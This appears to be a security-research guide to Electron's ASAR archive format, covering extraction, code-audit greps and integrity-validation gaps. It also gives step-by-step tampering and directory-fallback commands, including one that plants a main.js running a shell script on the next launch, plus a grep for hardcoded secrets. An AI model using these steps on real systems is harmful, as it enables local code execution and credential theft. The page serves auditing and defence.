---
title: ASAR Format
description: Electron's ASAR archive format — structure, integrity validation, extraction, and tampering attacks
---

# ASAR Format

ASAR is the archive format Electron uses to ship application source code. Think of it as a zip file without compression — a flat concatenation of files with a JSON index up front describing where each file starts and how long it is.

From a security research perspective, ASAR is both the first thing you open when assessing an Electron app (it contains all the JavaScript you need to audit) and an attack surface in its own right (without integrity checking, it can be modified and repacked by anyone with local write access to that file).

---

## Archive Structure

```
app.asar
├── [4-byte magic]
├── [4-byte header size]
├── [JSON header: file index with offsets]
└── [file data: files concatenated in order]
```

The JSON header looks like:

```json
{
  "files": {
    "package.json": { "size": 512, "offset": "0" },
    "main.js": { "size": 8192, "offset": "512" },
    "preload.js": { "size": 4096, "offset": "8704" },
    "node_modules": {
      "files": {
        "electron": {
          "files": { "index.js": { "size": 256, "offset": "12800" } }
        }
      }
    }
  }
}
```

---

## Where to Find app.asar

```
Windows: %LOCALAPPDATA%\Programs\<AppName>\resources\app.asar
macOS:   /Applications/<AppName>.app/Contents/Resources/app.asar
Linux:   /opt/<appname>/resources/app.asar
         /usr/lib/<appname>/resources/app.asar
```

---

## Extracting and Reading It

```bash
# Install the asar CLI:
npm install -g @electron/asar

# Extract everything:
asar extract app.asar /tmp/extracted/

# List contents (no extraction):
asar list app.asar

# Pull a single file:
asar extract-file app.asar main.js

# Repack a modified directory:
asar pack /tmp/modified/ app-modified.asar
```

After extracting, standard code audit tools work on the output directory — it's just JavaScript files.

---

## ASAR as Your Audit Starting Point

As a researcher, extracting the ASAR is step one on any Electron target. Everything interesting is in there:

```bash
asar extract app.asar /tmp/app/
cd /tmp/app/

# Find BrowserWindow security configs:
grep -r "nodeIntegration\|contextIsolation\|sandbox\|webSecurity" . \
  --include="*.js" -l

# Find preload scripts:
grep -r "preload:" . --include="*.js"

# Find IPC handlers:
grep -r "ipcMain\.\(on\|handle\)" . --include="*.js"

# Find dangerous API usage:
grep -r "exec\|spawn\|eval\|innerHTML\|openExternal\|writeFile" . \
  --include="*.js" -l | grep -v node_modules

# Find hardcoded secrets (the low-hanging fruit):
grep -r "key\|secret\|password\|token\|api_" . -i \
  --include="*.js" | grep -E "=\s*['\"][A-Za-z0-9+/=_-]{16,}" | \
  grep -v node_modules | head -20
```

That last grep finds hardcoded API keys. It finds them in production apps embarrassingly often — Stripe live keys, Twilio auth tokens, AWS access keys, internal service credentials. Three commands, no exploit needed.

---

## ASAR Tampering — The Local Attack

By default, Electron loads `app.asar` without any integrity check. If an attacker has local write access to the ASAR file, they can:

1. Extract the archive: `asar extract app.asar /tmp/modified/`
2. Edit `main.js` or `preload.js` to inject their code
3. Repack: `asar pack /tmp/modified/ app.asar`
4. Replace the original: `mv app.asar /path/to/resources/app.asar`

Next time the app launches, the attacker's code runs with the app's full identity — its signing certificate, its OS entitlements, its stored credentials, everything.

This is a **local privilege escalation** primitive. The value depends on what the app can do:

- App runs as administrator → LPE to SYSTEM/root
- App has keychain access → credential theft  
- App has camera/mic entitlements → surveillance
- App has network access as a trusted process → lateral movement

For bug bounty, ASAR tampering without elevated privileges is typically P3 (medium) — local write access is a precondition, so the blast radius is limited. But when combined with a writable ASAR path due to misconfigured ACLs, or when the app runs elevated, it becomes a P1/P2 LPE chain.

---

## The Directory Fallback Bypass

When `OnlyLoadAppFromAsar` fuse is disabled (the default), Electron has a fallback: if `app.asar` doesn't exist, it looks for an `app/` directory:

```
resources/
├── app.asar     ← loaded if present
└── app/         ← loaded if app.asar is missing
    ├── package.json
    └── main.js
```

This creates a bypass:

```bash
# Rename the ASAR instead of modifying it:
mv /opt/app/resources/app.asar /opt/app/resources/app.asar.bak

# Create a malicious directory:
mkdir -p /opt/app/resources/app/
echo '{"main":"main.js","name":"app"}' > /opt/app/resources/app/package.json
echo 'require("child_process").exec("bash /tmp/shell.sh")' > /opt/app/resources/app/main.js

# Next launch: Electron finds no app.asar, loads app/ directory instead
```

No ASAR extraction or repacking needed. Just rename and create.

---

## ASAR Integrity Validation

The `EnableEmbeddedAsarIntegrityValidation` fuse, when set at build time, validates the ASAR against SHA256 hashes embedded in the Electron binary. Modified archives don't match — app refuses to start.

This sounds like it closes the ASAR tampering vector. It does, with two significant caveats:

**Caveat 1: Unpacked files are never checked.**

Some native binaries and large files are placed outside the ASAR in `app.asar.unpacked/`:

```
resources/
├── app.asar
└── app.asar.unpacked/
    ├── native_module.node
    └── ffmpeg.dll
```

ASAR integrity validation doesn't cover `app.asar.unpacked/`. Modifying a `.node` file in the unpacked directory is not detected, even with integrity fuses enabled. `.node` native addons run outside the V8 sandbox — modifying one is equivalent to arbitrary code execution.

**Caveat 2: V8 snapshots bypass ASAR integrity entirely.**

V8 snapshot blobs (`snapshot_blob.bin`) are loaded before ASAR integrity validation runs. An attacker who can replace the snapshot blob executes arbitrary JavaScript that bypasses the entire check. See [V8 Snapshots](v8-snapshots.md) and CVE-2025-55305 for details.

---

## CVEs Involving ASAR

| CVE | Issue |
|-----|-------|
| CVE-2024-46992 | electron-updater path traversal places malicious EXE in arbitrary location (including Startup folder) via `latest.yml` `path` field |
| CVE-2025-55305 | V8 snapshot blob loaded before ASAR integrity check — bypasses integrity validation entirely (found in 1Password) |
